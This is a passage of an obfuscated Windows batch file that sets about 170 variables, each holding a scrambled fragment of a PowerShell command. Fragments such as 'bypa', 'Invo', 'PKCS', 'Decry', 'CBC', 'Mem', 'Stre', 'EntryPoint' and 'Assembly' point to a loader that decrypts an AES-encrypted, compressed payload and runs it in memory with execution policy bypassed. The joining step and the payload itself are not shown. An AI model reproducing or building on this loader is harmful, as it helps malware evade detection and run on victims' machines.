@echo off
set "TGFgifGBOh=pher"
set "mCwFTNfzXx=Star"
set "OAecbePAuj=.Mod"
set "cGlNfgvHkq=tem."
set "mlPPTZfbXf=IoO3"
set "EYWXOWdJkM=urit"
set "XuxabIlnSC=$fsc"
set "AntrRJjwwq=$pSU"
set "QZzMWKLBNe=daeR"
set "bHqVpSqGCq=embl"
set "DeBKFWeRuy=[IO."
set "UZyBLsELdi=; };"
set "CvCqeIadWs=);$X"
set "illclDmtFG=ptor"
set "CyNNqZzwEe=  $E"
set "eRBPkZPYxi=[Sys"
set "IIvouKrhUj=join"
set "HyyfUWpGkT=ion."
set "JYEZhsVbsz=tryP"
set "MLeTpluQqz=Fina"
set "qrJQfeofRQ=]::("
set "cWOvCSnfib=-Obj"
set "wINwrmaZAC=gMod"
set "MhZbPQTLPD=Pe);"
set "OvARhriMXj=FiIP"
set "FUjCYtPbBU=mory"
set "IHStKkRGTs=morF"
set "XTegrcBVvf=rofi"
set "HMOnlsVKTP=ress"
set "OTtJUXBiil='')("
set "LsphaNGacb=.Cre"
set "LKAzuGOclg=iafa"
set "NeiHyudhMT=le  "
set "vOSrSRLlGu=dsLS"
set "mhQGXAuJZZ=;$Fv"
set "zonbdtJlOc=d;$f"
set "vocwogbbrs=]::C"
set "AWGMMYpDUm== [S"
set "OJJLhlyZxy=esaB"
set "PnLzFbVuUt=-4] "
set "ufvJenJAat=S46e"
set "UFMzpvYZxs=();$"
set "rKaHGyfaVq=, $F"
set "QIDHyTvbuW=yste"
set "PvqbZQbcwU=e = "
set "kcttjFRDOH=qk.D"
set "dFjvhLwixP=ddin"
set "PptDiuzvWM=[Sys"
set "plOethXTBJ=bstr"
set "TYrcqgWoEw='gni"
set "qnzQWoczSZ=File"
set "lbGmDXcvmo=Obje"
set "RpLCribvzp=1..-"
set "AetYxnEDJe=JnGX"
set "SLvwJPGhmg=$XVg"
set "wbUKiZsdFm=ment"
set "brhBKTyrMm=stem"
set "sJxszzGIEU=Invo"
set "nVorxarXmB=ss -"
set "TRtkXBgxtn= [Sy"
set "TeaRLfwXxr=$FiI"
set "CcktUELRvj=fKtU"
set "rYgrZdwYxD=scaq"
set "uujnBYklaZ=tem."
set "YaOuhFDiRc=q.Pa"
set "hoIcYYCBan=yste"
set "TaRUJJDSZo=$XVg"
set "XAFIExrpQe=y]::"
set "GSqLSWrXpa=k; }"
set "JuFSKSRbMQ=);$p"
set "fcUTihoNhW=scaq"
set "qJXQwcYhXt=scaq"
set "qpUWuzNUkX=iron"
set "jsteioWInZ=m.Re"
set "nJonLpsZwI=$XVg"
set "LVauBNYccR=)($E"
set "ShwgXRsLiB=ddin"
set "zIGUEGQMiW=Comp"
set "KDvlZpXFrF=hy.A"
set "PbTESuzReI=).Sp"
set "dZEeeuTrQT=dI.T"
set "xCuqQebWud=New-"
set "REmeHPHjQA=ne);"
set "AGOjKZbjkE=oint"
set "NMGEjnLCHw= '')"
set "jcakhYnsut=m.IO"
set "tWDCzyujna=ay()"
set "pHsmcSAWTC=scaq"
set "uDzdRblTpF=ptog"
set "eyyxqbufOw=oL'["
set "unYyRJBZzr=8kuY"
set "HgeiRNCZgo=bypa"
set "QdHzFqXqnx=iafa"
set "UaZxKzVUBp=('ev"
set "MFdscxGGYk=fsca"
set "LODNzoONzT=ateD"
set "OGgNCjLuwM=bjec"
set "gTTkFrdjVP=null"
set "zNGEGdGPSD=kyhK"
set "uiQlKQkKuR=g = "
set "FhAFYZOQdK=in $"
set "WdagYgFyRY=form"
set "HlKHSPPVyj=lBlo"
set "aGDrFOxLsS='[-1"
set "MMUfFBSHsJ=.Con"
set "pSwPAzBiFA=esMa"
set "fakvPvjktU=iIPe"
set "LASmiUIDkP=am;$"
set "rnFdXZZyfY=ck($"
set "uthRjcGVjd=Pe ="
set "ftSpuHCGfG=ecry"
set "tNEBCUsFhu=em.C"
set "UjDFnURNBO=sLS."
set "ofRAWhrDHv=.Cop"
set "qThLCSOcAk=ose("
set "buXFQwXvVj=ionM"
set "kDkCPNqzKh=Bmor"
set "AFZfGrogZN=brea"
set "BXYihnhVeO=]::N"
set "APFvDRMYRp=)($F"
set "vBxYOoHSDx=.Sec"
set "QptTrWjWuI=;$Fv"
set "FPuZLNLYLv===')"
set "TvMIhoLPSa=CKuf"
set "kTvOMNWcgD=.Cry"
set "vLKdEVWDdE=Syst"
set "WqPbfaEuLg=e = "
set "ybnrNzhATG=rity"
set "NCcRusjHDh=stem"
set "VBBrWidvPB=::('"
set "LutkSsqMOh=fore"
set "apXUnFPcPi=BC;$"
set "GVJdoVoKPP=7kGw"
set "FrjqkyoKAz=oArr"
set "dmFmuSWsjS=rans"
set "PrhYoDUoiQ=ispo"
set "RdbxFuQDGg=$MnK"
set "juvzxAOLQD=ert]"
set "PicvUtsiLd=CuSj"
set "WCBGtxRQef== $f"
set "SCVSmfPxss=);$f"
set "CbbpjfiZyg=trea"
set "gtOuMLGwpr=tsWi"
set "czFLiGykVu=:: '"
set "TCwKEWHDYw=m(, "
set "DGOIqXpWqw=;$CK"
set "YQxmMIAMyw=PKCS"
set "SUbZIcaqaC=.Mem"
set "HwmxAuNlty=l) {"
set "KvjRbilDYq=THxh"
set "CjCWSaZDte=::De"
set "atcLujlFuw=Mode"
set "usHCBTSEMV=.Dis"
set "UvAPfXgOgb=Comp"
set "MdqcxccfDX= = $"
set "eLHsrapicw=ct S"
set "sqAbDKzYAu=aq.I"
set "eGDLnenZkG=)) {"
set "sDGkVtGLXw=Stre"
set "AYCDzqlnYo=sion"
